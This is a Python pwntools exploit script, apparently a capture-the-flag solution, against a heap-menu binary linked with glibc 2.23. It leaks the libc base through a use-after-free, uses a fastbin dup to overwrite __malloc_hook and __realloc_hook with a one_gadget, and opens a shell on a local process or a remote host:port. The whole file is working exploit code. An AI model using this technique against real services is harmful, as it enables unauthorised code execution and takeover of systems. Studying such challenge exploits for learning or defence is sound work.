from pwn import *
context(os="linux", arch="i386", kernel="amd64")

g_fname = './pwn'
elf = ELF(g_fname)
context.binary = elf

g_libcname = './libc-2.23.so'
libc = ELF(g_libcname)

if (args.REMOTE):
    host, port = args.REMOTE.split(':')
    g_io = remote(host, int(port))
else:
    g_io = process(g_fname)

def bpt():
    if not args.REMOTE:
        log.info('pid: %d' % g_io.proc.pid)
        pause()


s,sl,sa,sla = g_io.send, g_io.sendline, g_io.sendafter, g_io.sendlineafter
r, ra, rl, ru = g_io.recv, g_io.recvall, g_io.recvline, g_io.recvuntil

def opt(idx):
    sa(b'exit\n', str(idx).encode())

def create(sz, content):
    opt(1)
    sa(b'content --->\n', str(sz).encode())
    sa(b'Content --->\n', content)

def edit(idx, sz, content):
    opt(2)
    sa(b'Index --->\n', str(idx).encode())
    sa(b'content --->\n', str(sz).encode())
    sa(b'Content --->\n', content)

def delete(idx):
    opt(3)
    sa(b'Index --->\n', str(idx).encode())

def show(idx):
    opt(4)
    sa(b'Index --->\n', str(idx).encode())
    ru(b'Content: ')
    data = rl()[:-1]
    return data

def exp():
    # 1. UAF of unsorted bin to leak glibc
    create(0x100, b'a'*0x100) # 0
    create(0x20, b'#1, guard') # 1
    delete(0)
    addr_ub = show(0)
    log.info('addr of ub: %s' % addr_ub)
    addr_libc = u64(addr_ub.ljust(8, b'\x00')) - 0x3c4b78
    log.info('libc@%#x', addr_libc)

    libc.address = addr_libc
    addr_ogg = addr_libc + 0x4527a  # [rsp+0x30] == NULL
    realloc_hook = libc.sym['__realloc_hook']
    realloc = libc.sym['realloc'] + 0xc # start from 'sub rsp, 0x38'
    fake_chunk = realloc_hook - 0x1b # allocate to  [... __realloc | __malloc_hook]

    # 2. fastbin dup
    create(0x68, b'#2, fastbin dup') # 2
    create(0x20, b'#3, guard') # 3
    delete(2)
    edit(2, 0x68, p64(fake_chunk))
    create(0x68, b'#4, reallocate #2') # 4
    create(0x68, b'\x00'*0xb + p64(addr_ogg) + p64(realloc))
    bpt()
    opt(1) # get shell
    sa(b'content --->\n', '16')

if __name__ == '__main__':
    if args.DEBUG:
        context.log_level="debug"
    exp()
    g_io.interactive()
